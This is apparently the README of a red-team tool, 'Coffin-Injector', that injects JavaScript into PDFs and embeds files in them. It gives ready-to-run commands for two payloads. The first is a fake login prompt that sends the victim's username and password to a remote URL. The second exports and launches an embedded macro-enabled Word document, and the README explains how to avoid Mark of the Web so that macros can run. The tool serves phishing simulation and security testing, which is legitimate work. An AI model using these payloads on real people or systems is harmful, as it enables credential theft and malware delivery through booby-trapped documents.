# Coffin-Injector

A simple Python utility for injecting JavaScript payloads and embedding arbitrary files into PDF documents for use in red team assessments, phishing simulations, or client-side testing.

## ✨ Features

- Injects custom JavaScript payloads into the `/OpenAction` of a PDF file
- Allows full control over the JavaScript logic (e.g., alerts, credential prompts, redirects)
- Embeds external files (e.g., `.doc`, `.xls`, `.zip`) into the PDF for export and execution
- Maintains original PDF structure and readability

## ⚙ Requirements

- Python 3.7+
- `PyPDF2`

## 🚀 Quick Start

### Step 1: Set up a Virtual Environment

```bash
python3 -m venv venv
source venv/bin/activate
```

### Step 2: Install Dependencies

```bash
pip install PyPDF2
```

### Step 3: Run Coffin-Injector with JavaScript Credential Prompt

This payload injects a script that prompts the user for a username and password using `app.response()`, masks the password in a follow-up alert, and then exfiltrates the credentials using `app.launchURL()` to a remote server. Ideal for phishing or demonstrating alert-based credential theft.

```bash
python3 coffin-injector.py -i Resume.pdf -o poc.pdf -p 'var u=app.response("This document requires login to view.\rPlease enter your username:");var p=app.response("Please enter your password:","Password","",true);var mask=p.length>2?p[0]+"*".repeat(p.length-2)+p[p.length-1]:p;app.alert("This PDF has interactive features and should be opened in Adobe Acrobat for full compatibility.\r\rLogin:\rUsername: "+u+"\rPassword: "+mask);app.launchURL("https://example.com/?u="+escape(u)+"&p="+escape(p));'
```

### Step 4: Run Coffin-Injector with Embedded File and Export Trigger

This payload embeds a macro-enabled Word document into the PDF and injects a JavaScript trigger to export and launch the file when the PDF is opened. The `nLaunch: 1` parameter silently saves and auto-launches the embedded file without applying Mark of the Web, allowing macros to run if the user enables them in Office.

```bash
python3 coffin-injector2.py -i Resume.pdf -o calc.pdf -p 'app.alert("This document includes an embedded application. Click OK to extract."); this.exportDataObject({ cName: "example.doc", nLaunch: 1 });' -e example.doc
```

### 📦 Understanding `nLaunch` Behaviour

These options control how embedded files behave when extracted using `this.exportDataObject()`:

- `nLaunch: 0` — Prompts the user to **save** the embedded file. This method avoids the Mark of the Web (MOTW), meaning macro-enabled Office files will open with the **yellow Enable Content** banner, allowing execution when the user enables macros. However, after saving, the user must manually locate and open the file.
- `nLaunch: 1` — Prompts the user to **save** the embedded file, and then **prompts to launch** the saved file immediately after saving. This avoids MOTW and offers a streamlined path for executing embedded macro payloads if the user enables macros.
- `nLaunch: 2` — Launches the file directly from within the PDF environment without prompting for a save location. Because it's executed from a temporary and browser-like context, the file **inherits MOTW**, causing Office to block macros with a **red security banner**.

> **Note**: Basic payloads using `app.alert()` and `app.response()` have been tested and are functional in Chromium-based and Firefox browsers (native PDF viewer). However, more advanced functionality such as `app.launchURL()` and `exportDataObject()` is only supported and tested in Adobe Acrobat.

For a full list of supported JavaScript functions in PDF files, see Adobe’s official documentation:
[https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html](https://opensource.adobe.com/dc-acrobat-sdk-docs/library/jsapiref/index.html)

## 📁 Arguments

| Argument          | Description                                |
| ----------------- | ------------------------------------------ |
| `-i`, `--input`   | Path to the input PDF file                 |
| `-o`, `--output`  | Path for the output (patched) PDF          |
| `-p`, `--payload` | JavaScript payload to inject               |
| `-e`, `--embed`   | File to embed in the PDF (e.g., .doc file) |

## 📁 Default Payload

If no payload is supplied, the default behaviour is to inject:

```javascript
app.alert("PDF viewer allows XSS");
```

## 📝 License

This project is licensed under the [MIT License](LICENSE).

---

**Disclaimer:** For educational and authorised security testing purposes only.

